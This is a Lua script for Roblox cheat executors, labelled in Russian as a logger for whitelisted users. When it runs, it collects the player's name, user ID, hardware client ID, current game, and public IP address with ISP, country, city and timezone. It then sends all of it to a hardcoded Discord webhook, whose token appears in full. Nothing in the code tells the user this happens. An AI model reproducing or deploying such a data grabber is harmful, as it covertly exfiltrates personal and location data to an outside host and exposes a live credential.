-- logger.lua — только логгирование, вайтлист проверяется в основном файле

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")

local lp = Players.LocalPlayer
local hwid = RbxAnalytics:GetClientId()

local WEBHOOK_URL = "https://discord.com/api/webhooks/1471569290183442523/engyxPsJOc6mQpCcrpYKM5oYV7PS0J15aQEsaCuL96__qJqhbYaFGbkCRiVJqMFCksFD"

local function get_request_func()
    return syn and syn.request or http_request or request or nil
end

local function fetch_ip_info()
    local info = {query = "N/A", isp = "N/A", country = "N/A", city = "N/A", timezone = "N/A"}
    local req = get_request_func()
    if not req then return info end

    local ok, resp = pcall(req, {
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    if ok and resp and resp.Success and resp.Body then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, resp.Body)
        if ok2 and decoded then
            info = decoded
        end
    end
    return info
end

local req = get_request_func()
if not req then
    warn("[Logger] No request function")
    return
end

local ip_info = fetch_ip_info()
local place_id = game.PlaceId
local place_name = "Unknown"

pcall(function()
    place_name = MarketplaceService:GetProductInfo(place_id).Name
end)

local embed = {
    {
        ["title"] = "Script Executed",
        ["description"] = "✅ Whitelisted user loaded script",
        ["color"] = 0x00FF00,
        ["fields"] = {
            {["name"] = "Name",         ["value"] = lp.Name,                                           ["inline"] = true},
            {["name"] = "Display Name", ["value"] = lp.DisplayName,                                    ["inline"] = true},
            {["name"] = "User ID",      ["value"] = tostring(lp.UserId),                               ["inline"] = true},
            {["name"] = "HWID",         ["value"] = "```" .. hwid .. "```",                             ["inline"] = false},
            {["name"] = "Game",         ["value"] = place_name .. " (" .. tostring(place_id) .. ")",    ["inline"] = false},
            {["name"] = "Time",         ["value"] = os.date("%Y-%m-%d %H:%M:%S"),                      ["inline"] = false},
            {["name"] = "IP",           ["value"] = "||" .. (ip_info.query or "N/A") .. "||",           ["inline"] = false},
            {["name"] = "Provider",     ["value"] = ip_info.isp or "N/A",                              ["inline"] = true},
            {["name"] = "Country",      ["value"] = ip_info.country or "N/A",                          ["inline"] = true},
            {["name"] = "City",         ["value"] = ip_info.city or "N/A",                             ["inline"] = true},
            {["name"] = "Timezone",     ["value"] = ip_info.timezone or "N/A",                          ["inline"] = true},
        },
        ["footer"] = {["text"] = "Executor Logger"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
}

pcall(req, {
    Url = WEBHOOK_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({["embeds"] = embed})
})
